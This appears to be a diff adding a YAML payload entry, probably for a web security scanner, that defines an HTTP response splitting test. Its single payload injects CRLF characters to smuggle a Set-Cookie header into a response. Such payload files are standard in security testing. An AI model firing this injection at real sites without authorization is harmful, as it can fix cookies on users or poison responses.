@@ -1,0 +1,7 @@
+name: "HTTP_RESPONSE_SPLITTING"
+description: >
+  Header injection to split response.
+payloads:
+  - id: http_response_splitting
+    payload: "test%0d%0aSet-Cookie:%20evil=true"
+    description: Header injection to split response.
